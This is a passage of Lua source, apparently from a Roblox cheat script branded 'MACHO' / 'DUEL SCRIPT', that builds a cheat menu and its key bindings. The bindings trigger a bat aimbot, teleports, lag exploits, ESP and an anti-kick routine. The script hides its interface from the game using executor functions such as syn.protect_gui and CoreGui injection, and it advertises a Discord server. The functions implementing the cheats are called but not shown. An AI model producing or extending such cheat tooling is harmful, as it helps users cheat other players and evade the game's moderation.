			fn34(uiScaleValue - 0.05)
		end)

		local textButton6 = Instance.new("TextButton", frame5)
		textButton6.Size = UDim2.new(0, 28, 0, 24)
		textButton6.Position = UDim2.new(1, -64, 0.5, -12)
		textButton6.BackgroundColor3 = tbl30.blue
		textButton6.BackgroundTransparency = 0.5
		textButton6.BorderSizePixel = 0
		textButton6.Text = "+"
		textButton6.TextColor3 = tbl30.white
		textButton6.TextSize = 16
		textButton6.Font = Enum.Font.GothamBold
		guiCorner(textButton6, 6)

		textButton6.MouseButton1Click:Connect(function()
			fn34(uiScaleValue + 0.05)
		end)

		local textButton7 = Instance.new("TextButton", frame5)
		textButton7.Size = UDim2.new(0, 30, 0, 24)
		textButton7.Position = UDim2.new(1, -32, 0.5, -12)
		textButton7.BackgroundColor3 = tbl30.blueDark
		textButton7.BackgroundTransparency = 0.4
		textButton7.BorderSizePixel = 0
		textButton7.Text = "1x"
		textButton7.TextColor3 = Color3.fromRGB(200, 205, 215)
		textButton7.TextSize = 10.5
		textButton7.Font = Enum.Font.GothamBold
		guiCorner(textButton7, 6)
		guiStroke(textButton7, Color3.fromRGB(55, 55, 65), 1)

		textButton7.MouseButton1Click:Connect(function()
			fn34(1)
		end)

		local textButton8 = Instance.new("TextButton", frame5)
		textButton8.Size = UDim2.new(1, 0, 1, 0)
		textButton8.BackgroundTransparency = 1
		textButton8.Text = ""
		textButton8.ZIndex = 0

		textButton8.MouseEnter:Connect(function()
			tw(frame5, { BackgroundTransparency = 0.3 })
		end)

		textButton8.MouseLeave:Connect(function()
			tw(frame5, { BackgroundTransparency = 0.5 })
		end)

		local frame6 = Instance.new("Frame", visual)
		frame6.Size = UDim2.new(1, -8, 0, 32)
		frame6.BackgroundTransparency = 1
		frame6.LayoutOrder = 19
		local uiListLayout2 = Instance.new("UIListLayout", frame6)
		uiListLayout2.FillDirection = Enum.FillDirection.Horizontal
		uiListLayout2.Padding = UDim.new(0, 6)
		uiListLayout2.VerticalAlignment = Enum.VerticalAlignment.Center

		for _, v5 in ipairs({ 75, 90, 100, 115, 130 }) do
			local textButton9 = Instance.new("TextButton", frame6)
			textButton9.Size = UDim2.new(0, 56, 0, 26)
			textButton9.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
			textButton9.BorderSizePixel = 0
			textButton9.Text = tostring(v5) .. "%"
			textButton9.TextColor3 = Color3.fromRGB(230, 230, 235)
			textButton9.Font = Enum.Font.GothamBold
			textButton9.TextSize = 11
			textButton9.AutoButtonColor = false
			guiCorner(textButton9, 6)
			guiStroke(textButton9, Color3.fromRGB(50, 50, 58), 1)
			tbl38[v5] = textButton9

			textButton9.MouseButton1Click:Connect(function()
				fn34(v5 / 100)
			end)
		end

		fn33(uiScaleValue)

		createTextLabel(visual, "Mobile Buttons Size", 20, function()
			return tonumber(n13) or 80
		end, function(arg)
			n13 = math.floor(arg + 0.5)

			if flag24 and buildMobileButtons then
				buildMobileButtons()
			end
		end, function(arg)
			return tostring(math.floor(arg + 0.5))
		end, 10, 50, 140)

		addToggleRow(visual, "Show Mobile Buttons", flag24, 20, nil, function(arg)
			flag24 = arg

			if arg then
				if buildMobileButtons then
					buildMobileButtons()
				end
			elseif destroyMobileButtons then
				destroyMobileButtons()
			end

			saveConfig()
		end)

		addToggleRow(visual, "Show Circle Logo", visible, 22, nil, function(arg)
			visible = arg == true

			if logoCircleRef then
				logoCircleRef.Visible = visible
			elseif GuiRefs.logoCircle then
				GuiRefs.logoCircle.Visible = visible
			end

			pcall(function()
				local headerFrame = GuiRefs.inner and GuiRefs.inner:FindFirstChild("HeaderFrame", true)

				if not headerFrame and GuiRefs.chromeGroup then
					headerFrame = GuiRefs.chromeGroup:FindFirstChild("HeaderFrame", true)
				end

				if headerFrame then
					if not headerFrame:FindFirstChild("TextLabel") then
						headerFrame:FindFirstChildWhichIsA("TextLabel")
					end

					for _, child in ipairs(headerFrame:GetChildren()) do
						local isTextLabel = child:IsA("TextLabel")
						local flag41

						if isTextLabel then
							flag41 = child.Text == "MACHO" or child.Text == "MACHO"
						else
							flag41 = isTextLabel
						end

						if flag41 then
							child.Position = visible and UDim2.new(0, 60, 0, 8) or UDim2.new(0, 14, 0, 8)
						elseif child:IsA("TextLabel") and child.Text:find("PREMIUM") then
							child.Position = visible and UDim2.new(0, 60, 0, 32) or UDim2.new(0, 14, 0, 32)
						end
					end
				end
			end)

			saveConfig()
		end)

		addToggleRow(visual, "Lock All (freeze everything)", flag33, 16, nil, function(arg)
			flag33 = arg
			saveConfig()
		end)

		addSectLbl(visual, "RESET", 14)
		local frame7 = Instance.new("Frame")
		frame7.Size = UDim2.new(1, 0, 0, 40)
		frame7.BackgroundColor3 = tbl30.row
		frame7.BackgroundTransparency = 0.5
		frame7.BorderSizePixel = 0
		frame7.LayoutOrder = 15
		frame7.Parent = visual
		guiCorner(frame7, 10)
		guiStroke(frame7, tbl30.divider, 1)
		local textLabel7 = Instance.new("TextLabel", frame7)
		textLabel7.Size = UDim2.new(0.55, 0, 1, 0)
		textLabel7.Position = UDim2.new(0, 12, 0, 0)
		textLabel7.BackgroundTransparency = 1
		textLabel7.Text = "Reset Settings"
		textLabel7.TextColor3 = tbl30.text
		textLabel7.TextSize = 12.5
		textLabel7.Font = Enum.Font.GothamBold
		textLabel7.TextXAlignment = Enum.TextXAlignment.Left
		local textButton9 = Instance.new("TextButton", frame7)
		textButton9.Size = UDim2.new(0, 54, 0, 24)
		textButton9.Position = UDim2.new(1, -62, 0.5, -12)
		textButton9.BackgroundColor3 = Color3.fromRGB(150, 30, 40)
		textButton9.BackgroundTransparency = 0.2
		textButton9.BorderSizePixel = 0
		textButton9.Text = "RESET"
		textButton9.TextColor3 = tbl30.white
		textButton9.TextSize = 11
		textButton9.Font = Enum.Font.GothamBold
		guiCorner(textButton9, 5)

		textButton9.MouseButton1Click:Connect(function()
			resetAllSettings()
		end)

		local textButton10 = Instance.new("TextButton", frame7)
		textButton10.Size = UDim2.new(1, 0, 1, 0)
		textButton10.BackgroundTransparency = 1
		textButton10.Text = ""
		textButton10.ZIndex = 0

		textButton10.MouseEnter:Connect(function()
			tw(frame7, { BackgroundTransparency = 0.3 })
		end)

		textButton10.MouseLeave:Connect(function()
			tw(frame7, { BackgroundTransparency = 0.5 })
		end)
	end

	fn31()

	local function fn32()
		local background = tbl36.contents.Background
		if not background then
			return
		end
		addSectLbl(background, "BACKGROUND LIST", 0)
		local frame2 = Instance.new("Frame")
		frame2.Size = UDim2.new(1, 0, 0, 0)
		frame2.AutomaticSize = Enum.AutomaticSize.Y
		frame2.BackgroundColor3 = tbl30.row
		frame2.BackgroundTransparency = 0.55
		frame2.BorderSizePixel = 0
		frame2.LayoutOrder = 1
		frame2.Parent = background
		guiCorner(frame2, 12)
		guiStroke(frame2, tbl30.divider, 1)
		local uiListLayout = Instance.new("UIListLayout", frame2)
		uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout.Padding = UDim.new(0, 4)
		local uiPadding = Instance.new("UIPadding", frame2)
		uiPadding.PaddingTop = UDim.new(0, 8)
		uiPadding.PaddingBottom = UDim.new(0, 10)
		uiPadding.PaddingLeft = UDim.new(0, 6)
		uiPadding.PaddingRight = UDim.new(0, 6)
		local textLabel = Instance.new("TextLabel", frame2)
		textLabel.Size = UDim2.new(1, 0, 0, 20)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = "Background List  ·  tap a preview"
		textLabel.TextColor3 = tbl30.textDim
		textLabel.TextSize = 11
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.LayoutOrder = 0
		local frame3 = Instance.new("Frame", frame2)
		frame3.Name = "BackgroundList"
		frame3.Size = UDim2.new(1, 0, 0, 0)
		frame3.AutomaticSize = Enum.AutomaticSize.Y
		frame3.BackgroundTransparency = 1
		frame3.BorderSizePixel = 0
		frame3.LayoutOrder = 1
		frame3.ZIndex = 5
		local uiListLayout2 = Instance.new("UIListLayout", frame3)
		uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
		uiListLayout2.Padding = UDim.new(0, 10)
		local uiPadding2 = Instance.new("UIPadding", frame3)
		uiPadding2.PaddingTop = UDim.new(0, 4)
		uiPadding2.PaddingBottom = UDim.new(0, 4)
		uiPadding2.PaddingLeft = UDim.new(0, 2)
		uiPadding2.PaddingRight = UDim.new(0, 2)
		local tbl37 = {}

		local function fn33(arg)
			for i, v5 in ipairs(tbl37) do
				if v5.stroke then
					v5.stroke.Color = i == arg and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(60, 60, 70)
					v5.stroke.Thickness = i == arg and 2 or 1
				end

				if v5.badge then
					v5.badge.Visible = i == arg
				end
			end
		end

		for i, v5 in ipairs(tbl10) do
			local imageButton = Instance.new("ImageButton", frame3)
			imageButton.Size = UDim2.new(1, -8, 0, 130)
			imageButton.BackgroundColor3 = Color3.fromRGB(12, 12, 16)
			imageButton.BackgroundTransparency = 0.05
			imageButton.Image = v5.url or image
			imageButton.ImageColor3 = v5.tint or Color3.fromRGB(255, 255, 255)
			imageButton.ScaleType = Enum.ScaleType.Crop
			imageButton.BorderSizePixel = 0
			imageButton.AutoButtonColor = false
			imageButton.LayoutOrder = i
			imageButton.ZIndex = 6
			imageButton.ImageTransparency = 0
			guiCorner(imageButton, 12)
			local v6 = guiStroke(imageButton, fn3(), 1.4)
			local frame4 = Instance.new("Frame", imageButton)
			frame4.Size = UDim2.new(1, 0, 0, 32)
			frame4.Position = UDim2.new(0, 0, 1, -32)
			frame4.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
			frame4.BackgroundTransparency = 0.35
			frame4.BorderSizePixel = 0
			frame4.ZIndex = 7
			guiCorner(frame4, 12)
			local textLabel2 = Instance.new("TextLabel", imageButton)
			textLabel2.Size = UDim2.new(1, -90, 0, 22)
			textLabel2.Position = UDim2.new(0, 12, 1, -28)
			textLabel2.BackgroundTransparency = 1
			textLabel2.Text = v5.name or "Background " .. tostring(i)
			textLabel2.TextColor3 = Color3.fromRGB(240, 240, 245)
			textLabel2.TextSize = 12
			textLabel2.Font = Enum.Font.GothamBold
			textLabel2.TextXAlignment = Enum.TextXAlignment.Left
			textLabel2.ZIndex = 8
			local textLabel3 = Instance.new("TextLabel", imageButton)
			textLabel3.Size = UDim2.new(0, 64, 0, 20)
			textLabel3.Position = UDim2.new(1, -74, 1, -26)
			textLabel3.BackgroundColor3 = Color3.fromRGB(40, 40, 48)
			textLabel3.Text = "ACTIVE"
			textLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
			textLabel3.TextSize = 9
			textLabel3.Font = Enum.Font.GothamBold
			textLabel3.ZIndex = 8
			textLabel3.Visible = n17 == i
			guiCorner(textLabel3, 6)
			tbl37[i] = { stroke = v6, badge = textLabel3, img = imageButton }

			task.spawn(function()
				for i2 = 1, 25 do
					local v7 = tbl20[i]

					if v7 and v7 ~= "" then
						imageButton.Image = v7
						break
					elseif i2 == 3 then
						local v8 = fn8(v5)

						if v8 ~= "" then
							tbl20[i] = v8
							imageButton.Image = v8
							break
						else
							task.wait(0.12)
						end
					else
						task.wait(0.12)
					end
				end

				if imageButton.Image == "" then
					imageButton.Image = v5.url
				end
			end)

			imageButton.MouseButton1Click:Connect(function()
				applyBackgroundImage(i)
				fn33(i)
				saveConfig()
			end)
		end

		task.defer(function()
			fn33(n17 or 0)

			if n17 and n17 > 0 then
				applyBackgroundImage(n17)
			end
		end)
	end

	fn32()

	local function fn33()
		local keybinds = tbl36.contents.Keybinds

		local tbl37 = {
			[Enum.KeyCode.ButtonA] = true,
			[Enum.KeyCode.ButtonB] = true,
			[Enum.KeyCode.ButtonX] = true,
			[Enum.KeyCode.ButtonY] = true,
			[Enum.KeyCode.ButtonL1] = true,
			[Enum.KeyCode.ButtonR1] = true,
			[Enum.KeyCode.ButtonL2] = true,
			[Enum.KeyCode.ButtonR2] = true,
			[Enum.KeyCode.ButtonL3] = true,
			[Enum.KeyCode.ButtonR3] = true,
			[Enum.KeyCode.ButtonStart] = true,
			[Enum.KeyCode.ButtonSelect] = true,
			[Enum.KeyCode.DPadUp] = true,
			[Enum.KeyCode.DPadDown] = true,
			[Enum.KeyCode.DPadLeft] = true,
			[Enum.KeyCode.DPadRight] = true,
		}

		local function fn34(arg)
			return arg and arg.UserInputType and tostring(arg.UserInputType.Name):match("^Gamepad") ~= nil
		end

		local function fn35(arg)
			if not arg or arg.KeyCode == Enum.KeyCode.Unknown then
				return false
			end

			if arg.UserInputType == Enum.UserInputType.Keyboard then
				return true
			end
			return fn34(arg) and tbl37[arg.KeyCode] == true
		end

		local function fn36(arg)
			if not arg then
				return "..."
			end
			local tbl38 = {}

			if arg.kb then
				table.insert(tbl38, arg.kb.Name)
			end

			if arg.gp then
				table.insert(tbl38, arg.gp.Name)
			end

			if #tbl38 == 0 then
				return "..."
			end
			return table.concat(tbl38, " / ")
		end

		local flag41 = false

		local function createFrame(arg, text3, arg2, layoutOrder)
			local frame2 = Instance.new("Frame", arg)
			frame2.Size = UDim2.new(1, 0, 0, 40)
			frame2.BackgroundColor3 = tbl30.row
			frame2.BackgroundTransparency = 0.5
			frame2.BorderSizePixel = 0
			frame2.LayoutOrder = layoutOrder or 0
			guiCorner(frame2, 10)
			guiStroke(frame2, tbl30.divider, 1)
			local textLabel = Instance.new("TextLabel", frame2)
			textLabel.Size = UDim2.new(1, -110, 1, 0)
			textLabel.Position = UDim2.new(0, 12, 0, 0)
			textLabel.BackgroundTransparency = 1
			textLabel.Text = text3
			textLabel.TextColor3 = tbl30.text
			textLabel.TextSize = 12.5
			textLabel.Font = Enum.Font.GothamBold
			textLabel.TextXAlignment = Enum.TextXAlignment.Left

			local function fn37()
				return fn36(arg2)
			end

			local textButton = Instance.new("TextButton", frame2)
			textButton.Size = UDim2.new(0, 96, 0, 24)
			textButton.Position = UDim2.new(1, -104, 0.5, -12)
			textButton.BackgroundColor3 = tbl30.input or tbl30.blueDark or Color3.fromRGB(16, 16, 16)
			textButton.BorderSizePixel = 0
			textButton.AutoButtonColor = false
			textButton.ZIndex = 5
			textButton.Text = fn37()
			textButton.TextColor3 = tbl30.white
			textButton.TextSize = 11
			textButton.Font = Enum.Font.GothamMedium
			textButton.TextTruncate = Enum.TextTruncate.AtEnd
			guiCorner(textButton, 6)
			guiStroke(textButton, tbl30.divider, 1)
			local flag42 = false
			local connection4 = nil
			local n20 = 0

			textButton.MouseButton1Click:Connect(function()
				if flag42 then
					flag42 = false
					flag41 = false

					if connection4 then
						connection4:Disconnect()
						connection4 = nil
					end

					textButton.Text = fn37()
					textButton.TextColor3 = tbl30.white
					return
				end

				flag42 = true
				flag41 = true
				n20 = tick()
				textButton.Text = "Press key..."
				textButton.TextColor3 = Color3.fromRGB(255, 200, 220)

				connection4 = UserInputService.InputBegan:Connect(function(input)
					if not flag42 then
						return
					end

					if input.KeyCode == Enum.KeyCode.Escape then
						flag42 = false
						flag41 = false

						if connection4 then
							connection4:Disconnect()
							connection4 = nil
						end

						textButton.Text = fn37()
						textButton.TextColor3 = tbl30.white
						return
					end

					local v5 = fn34(input)
					if v5 and tick() - n20 < 0.15 then
						return
					end

					if not fn35(input) then
						return
					end

					if v5 then
						arg2.gp = input.KeyCode
					else
						arg2.kb = input.KeyCode
					end

					if text3 == "Hide GUI" then
						tbl32.guiHide = arg2.kb or tbl32.guiHide
					end

					if text3 == "Carry Speed" then
						tbl32.carryMode = arg2.kb or tbl32.carryMode
					end

					if text3 == "Lagger Mode" then
						tbl32.laggerToggle = arg2.kb or tbl32.laggerToggle
					end

					if text3 == "Lagger Carry" then
						tbl32.laggerCarry = arg2.kb or tbl32.laggerCarry
					end

					if text3 == "Auto Bat" then
						tbl32.circle = arg2.kb or tbl32.circle
					end

					if text3 == "TP Bat" then
						tbl32.tpBat = arg2.kb or tbl32.tpBat
					end

					if text3 == "Auto Left" then
						tbl32.autoLeft = arg2.kb or tbl32.autoLeft
					end

					if text3 == "Auto Right" then
						tbl32.autoRight = arg2.kb or tbl32.autoRight
					end

					if text3 == "Drop Brainrot" then
						tbl32.dropBrainrot = arg2.kb or tbl32.dropBrainrot
					end

					if text3 == "TP Down" then
						tbl32.tpDown = arg2.kb or tbl32.tpDown
					end

					if text3 == "BAT V2" then
						tbl32.batV2 = arg2.kb or tbl32.batV2
					end

					flag42 = false
					flag41 = false

					if connection4 then
						connection4:Disconnect()
						connection4 = nil
					end

					textButton.Text = fn37()
					textButton.TextColor3 = tbl30.white
					pcall(saveConfig)
				end)
			end)

			local textButton2 = Instance.new("TextButton", frame2)
			textButton2.Size = UDim2.new(1, 0, 1, 0)
			textButton2.BackgroundTransparency = 1
			textButton2.Text = ""
			textButton2.ZIndex = 0

			textButton2.MouseEnter:Connect(function()
				tw(frame2, { BackgroundTransparency = 0.3 })
			end)

			textButton2.MouseLeave:Connect(function()
				tw(frame2, { BackgroundTransparency = 0.5 })
			end)

			return frame2
		end

		addSectLbl(keybinds, "Keybinds (PC + Gamepad)", 0)
		createFrame(keybinds, "Hide GUI", tbl22.GuiHide, 1)
		createFrame(keybinds, "Carry Speed", tbl22.SpeedToggle, 2)
		createFrame(keybinds, "Lagger Mode", tbl22.LaggerToggle, 3)
		createFrame(keybinds, "Lagger Carry", tbl22.LaggerCarry, 4)
		createFrame(keybinds, "Auto Bat", tbl22.AutoBat, 5)
		createFrame(keybinds, "BAT V2", tbl22.BatV2, 5)
		createFrame(keybinds, "TP Bat", tbl22.TPBat, 6)
		createFrame(keybinds, "Auto Left", tbl22.AutoLeft, 7)
		createFrame(keybinds, "Auto Right", tbl22.AutoRight, 8)
		createFrame(keybinds, "Drop Brainrot", tbl22.DropBrainrot, 9)
		createFrame(keybinds, "TP Down", tbl22.TPFloor, 10)
	end

	fn33()

	local function fn34(arg, arg2)
		if not arg2 or arg2 == Enum.KeyCode.Unknown then
			return false
		end

		if not arg or type(arg) ~= "table" then
			return false
		end

		if arg.kb and arg2 == arg.kb then
			return true
		end

		if arg.gp and arg2 == arg.gp then
			return true
		end
		return false
	end

	local function fn35(arg)
		if not arg or arg == Enum.KeyCode.Unknown then
			return false
		end

		for _, v5 in pairs(tbl22) do
			if type(v5) == "table" and (v5.kb == arg or v5.gp == arg) then
				return true
			end
		end

		for _, v5 in pairs(tbl32) do
			if v5 == arg then
				return true
			end
		end

		return false
	end

	local tbl37 = {}

	local function fn36(arg)
		local now2 = tick()
		if now2 < (tbl37[arg] or 0) + 0.25 then
			return false
		end
		tbl37[arg] = now2
		return true
	end

	UserInputService.InputBegan:Connect(function(input, gameProcessed)
		if UserInputService:GetFocusedTextBox() then
			return
		end
		local keyCode = input.KeyCode
		if keyCode == Enum.KeyCode.Unknown then
			return
		end

		if keyCode == Enum.KeyCode.Thumbstick1 or keyCode == Enum.KeyCode.Thumbstick2 then
			return
		end

		if gameProcessed and not fn35(keyCode) then
			return
		end

		if keyCode == tbl32.guiHide or fn34(tbl22.GuiHide, keyCode) then
			if not fn36("guiHide") then
				return
			end

			if GuiRefs.outer and GuiRefs.outer.Visible then
				if GuiRefs.hideGui then
					GuiRefs.hideGui()
				else
					GuiRefs.outer.Visible = false
				end
			elseif GuiRefs.showGui then
				GuiRefs.showGui()
			elseif GuiRefs.outer then
				GuiRefs.outer.Visible = true
			end
		elseif keyCode == tbl32.speed then
			speedToggleAction()
			saveConfig()
		elseif keyCode == tbl32.carryMode or fn34(tbl22.SpeedToggle, keyCode) then
			toggleCarryMode()
			saveConfig()
		elseif keyCode == tbl32.laggerToggle or fn34(tbl22.LaggerToggle, keyCode) then
			if not fn36("laggerToggle") then
				return
			end
			toggleLaggerMode()
			saveConfig()
		elseif keyCode == tbl32.laggerCarry or fn34(tbl22.LaggerCarry, keyCode) then
			if not fn36("laggerCarry") then
				return
			end
			toggleLaggerCarry()
			saveConfig()
		elseif keyCode == tbl32.batV2 or fn34(tbl22.BatV2, keyCode) then
			tbl3.toggleBatV2()
		elseif keyCode == tbl32.circle or fn34(tbl22.AutoBat, keyCode) then
			flag13 = not flag13

			if flag13 then
				startBatAimbot()
			else
				stopBatAimbot()
			end

			if autoBatSetVisual then
				autoBatSetVisual(flag13)
			end

			if tbl6.autoBat then
				tbl6.autoBat(flag13)
			end

			saveConfig()
		elseif keyCode == tbl32.dropBrainrot or fn34(tbl22.DropBrainrot, keyCode) then
			runDrop()
		elseif keyCode == tbl32.tpDown or fn34(tbl22.TPFloor, keyCode) then
			runTPFloor()
		elseif keyCode == tbl32.tpBat or fn34(tbl22.TPBat, keyCode) then
			if tbl3.tpBat then
				tbl3.stopTPBat()
			elseif not (tbl27 and tbl27.tryStart and not tbl27.tryStart()) then
				tbl3.startTPBat()
			end

			if tbl3.setTPBatVisual then
				tbl3.setTPBatVisual(tbl3.tpBat)
			end

			if tbl6.tpBat then
				tbl6.tpBat(tbl3.tpBat)
			end

			saveConfig()
		elseif keyCode == tbl32.autoLeft or fn34(tbl22.AutoLeft, keyCode) then
			if flag11 then
				flag11 = false
				stopAutoLeft()
			elseif not (tbl27 and tbl27.tryStart and not tbl27.tryStart()) then
				if flag12 then
					flag12 = false
					stopAutoRight()

					if v2 then
						v2(false)
					end

					if tbl6.autoRight then
						tbl6.autoRight(false)
					end
				end

				if flag13 then
					stopBatAimbot()

					if autoBatSetVisual then
						autoBatSetVisual(false)
					end

					if tbl6.autoBat then
						tbl6.autoBat(false)
					end
				end

				flag11 = true
				startAutoLeft()
			end

			if v then
				v(flag11)
			end

			if tbl6.autoLeft then
				tbl6.autoLeft(flag11)
			end

			saveConfig()
		elseif keyCode == tbl32.autoRight or fn34(tbl22.AutoRight, keyCode) then
			if flag12 then
				flag12 = false
				stopAutoRight()
			elseif not (tbl27 and tbl27.tryStart and not tbl27.tryStart()) then
				if flag11 then
					flag11 = false
					stopAutoLeft()

					if v then
						v(false)
					end

					if tbl6.autoLeft then
						tbl6.autoLeft(false)
					end
				end

				if flag13 then
					stopBatAimbot()

					if autoBatSetVisual then
						autoBatSetVisual(false)
					end

					if tbl6.autoBat then
						tbl6.autoBat(false)
					end
				end

				flag12 = true
				startAutoRight()
			end

			if v2 then
				v2(flag12)
			end

			if tbl6.autoRight then
				tbl6.autoRight(flag12)
			end

			saveConfig()
		end
	end)

	if flag5 then
		startHoldInfJump()
	end

	if flag4 then
		startAntiRagdoll()
	end

	if flag6 then
		setupMedusa(localPlayer.Character)
	end

	if flag34 then
		startESP()
	end

	tbl3.antiKick = true
	tbl3.enableAntiKick()
	CandyApplyCustomSky(text)
	buildMobileButtons()

	pcall(function()
		if fn5 then
			fn5()
		end

		if applyBackgroundImage then
			applyBackgroundImage(math.max(1, tonumber(n17) or 1))
		end

		if logoCircleRef then
			logoCircleRef.Visible = visible == true
			logoCircleRef.Image = image
		end

		if GuiRefs and GuiRefs.machoTitle and GuiRefs.machoTitle:IsA("TextLabel") then
			GuiRefs.machoTitle.TextColor3 = fn3()
		end
	end)

	GuiRefs.chromeGroup = GuiRefs.inner

	pcall(function()
		local tbl38 = {}

		local function fn37(arg)
			if not arg then
				return
			end

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("UIStroke") then
					table.insert(tbl38, descendant)
				end
			end
		end

		fn37(GuiRefs.outer)
		fn37(GuiRefs.inner)

		local function fn38(arg)
			local color2 = Color3.new(arg.R * 0.25, arg.G * 0.25, arg.B * 0.25)
			local min = math.min
			local n20 = arg.B * 0.55 + 0.45
			local color3 = Color3.new(math.min(1, arg.R * 0.55 + 0.45), math.min(1, arg.G * 0.55 + 0.45), min(1, n20))
			local colorSequence = ColorSequence.new
			local tbl39 = {}
			local v5 = ColorSequenceKeypoint.new(0, color2)
			local v6 = ColorSequenceKeypoint.new(0.35, arg)
			local v7 = ColorSequenceKeypoint.new(0.55, color3)
			local v8 = ColorSequenceKeypoint.new(0.75, arg)
			local new = ColorSequenceKeypoint.new
			tbl39[1] = v5
			tbl39[2] = v6
			tbl39[3] = v7
			tbl39[4] = v8

			do
				local values = table.pack(new(1, color2))
				table.move(values, 1, values.n, 5, tbl39)
			end

			return colorSequence(tbl39)
		end

		local function createUIGradient(parent)
			if not parent or parent:FindFirstChild("MachoNeonGrad") then
				return
			end
			local uiGradient = Instance.new("UIGradient")
			uiGradient.Name = "MachoNeonGrad"
			uiGradient.Color = fn38(fn3())
			uiGradient.Rotation = 0
			uiGradient.Parent = parent
			return uiGradient
		end

		local tbl39 = {}

		if GuiRefs.inner then
			local uiStroke = GuiRefs.inner:FindFirstChildOfClass("UIStroke")

			if uiStroke then
				table.insert(tbl39, createUIGradient(uiStroke) or uiStroke:FindFirstChild("MachoNeonGrad"))
			end
		end

		if GuiRefs.outer then
			for _, descendant in ipairs(GuiRefs.outer:GetDescendants()) do
				if descendant:IsA("UIStroke") and descendant.Thickness and descendant.Thickness >= 1.2 then
					local v5 = createUIGradient(descendant)

					if v5 then
						table.insert(tbl39, v5)
					end
				end
			end
		end

		local now2 = tick()

		RunService.RenderStepped:Connect(function()
			local n20 = tick() - now2
			local n21 = 0.5 + 0.5 * math.sin(n20 * 2.2)
			local v5 = fn3()
			local clamp = math.clamp
			local n22 = v5.B * (0.75 + 0.35 * n21)
			local color2 = Color3.new(math.clamp(v5.R * (0.75 + 0.35 * n21), 0, 1), math.clamp(v5.G * (0.75 + 0.35 * n21), 0, 1), clamp(n22, 0, 1))

			for _, v6 in ipairs(tbl39) do
				if v6 and v6.Parent then
					v6.Color = fn38(v5)
					v6.Offset = Vector2.new(math.sin(n20 * 0.9) * 0.55, 0)
					v6.Rotation = n20 * 35 % 360
				end
			end

			if GuiRefs.inner then
				local uiStroke = GuiRefs.inner:FindFirstChildOfClass("UIStroke")

				if uiStroke then
					uiStroke.Color = color2
					uiStroke.Thickness = 1.6 + n21 * 0.7
					uiStroke.Transparency = 0.08 + (1 - n21) * 0.12
				end
			end

			if GuiRefs.machoTitle and GuiRefs.machoTitle:IsA("TextLabel") then
				local n23 = 0.75 + 0.25 * math.sin(n20 * 2.8)
				GuiRefs.machoTitle.TextColor3 = Color3.new(math.clamp(v5.R * (0.75 + 0.25 * n23), 0, 1), math.clamp(v5.G * (0.75 + 0.25 * n23), 0, 1), math.clamp(v5.B * (0.75 + 0.25 * n23), 0, 1))
			elseif GuiRefs.machoTitle and (GuiRefs.machoTitle:IsA("ImageLabel") or GuiRefs.machoTitle:IsA("ImageButton")) then
				GuiRefs.machoTitle.ImageColor3 = v5
			end
		end)
	end)

	pcall(function()
		local machoTitle = GuiRefs.machoTitle

		if machoTitle then
			machoTitle.ZIndex = 50

			if machoTitle:IsA("TextLabel") then
				machoTitle.TextColor3 = fn3()
			end
		end
	end)

	if GuiRefs.inner then
		GuiRefs.inner.BackgroundTransparency = 0
	end
end

fn24()

task.spawn(function()
	pcall(function()
		local v5 = ipairs
		local tbl30 = {}
		local CoreGui = game:GetService("CoreGui")
		local playerGui = localPlayer:FindFirstChild("PlayerGui") or localPlayer:WaitForChild("PlayerGui", 5)
		tbl30[1] = CoreGui
		tbl30[2] = playerGui

		for _, v6 in v5(tbl30) do
			if v6 then
				local freeDuelWatermark = v6:FindFirstChild("FreeDuelWatermark")

				if freeDuelWatermark then
					freeDuelWatermark:Destroy()
				end
			end
		end
	end)

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "FreeDuelWatermark"
	screenGui.ResetOnSpawn = false
	screenGui.IgnoreGuiInset = true
	screenGui.DisplayOrder = 999
	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

	pcall(function()
		if syn and syn.protect_gui then
			syn.protect_gui(screenGui)
		end
	end)

	if not pcall(function()
		screenGui.Parent = game:GetService("CoreGui")
	end) then
		screenGui.Parent = localPlayer:WaitForChild("PlayerGui")
	end

	local frame = Instance.new("Frame")
	frame.Name = "Holder"
	frame.Size = UDim2.new(0, 400, 0, 60)
	frame.AnchorPoint = Vector2.new(0.5, 1)
	frame.Position = UDim2.new(0.5, 0, 0.92, 0)
	frame.BackgroundTransparency = 1
	frame.Visible = true
	frame.ZIndex = 100
	frame.Parent = screenGui
	local textLabel = Instance.new("TextLabel")
	textLabel.Name = "Title"
	textLabel.Text = "DUEL SCRIPT"
	textLabel.Size = UDim2.new(1, 0, 0, 32)
	textLabel.Position = UDim2.new(0, 0, 0, 0)
	textLabel.BackgroundTransparency = 1
	textLabel.Font = Enum.Font.GothamBlack
	textLabel.TextSize = 26
	textLabel.TextColor3 = fn3 and fn3() or Color3.fromRGB(0, 255, 120)
	textLabel.TextStrokeTransparency = 0.25
	textLabel.TextStrokeColor3 = Color3.new(0, 0, 0)
	textLabel.ZIndex = 101
	textLabel.Parent = frame
	local textLabel2 = Instance.new("TextLabel")
	textLabel2.Name = "Discord"
	textLabel2.Text = "discord.gg/irish"
	textLabel2.Size = UDim2.new(1, 0, 0, 24)
	textLabel2.Position = UDim2.new(0, 0, 0, 32)
	textLabel2.BackgroundTransparency = 1
	textLabel2.Font = Enum.Font.GothamBold
	textLabel2.TextSize = 24
	textLabel2.TextColor3 = fn3 and fn3() or Color3.fromRGB(0, 255, 120)
	textLabel2.TextStrokeTransparency = 0.3
	textLabel2.TextStrokeColor3 = Color3.new(0, 0, 0)
	textLabel2.ZIndex = 101
	textLabel2.Parent = frame
	local n20 = 0

	RunService.RenderStepped:Connect(function()
		if not screenGui or not screenGui.Parent then
			return
		end
		local character = localPlayer.Character
		local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
		local currentCamera = workspace.CurrentCamera

		if humanoidRootPart and currentCamera then
			local v5, v6 = currentCamera:WorldToViewportPoint(humanoidRootPart.Position + Vector3.new(0, 4.5, 0))
			frame.Visible = true

			if v6 and v5.Z > 0 then
				frame.Position = UDim2.new(0, v5.X, 0, v5.Y - 8)
			else
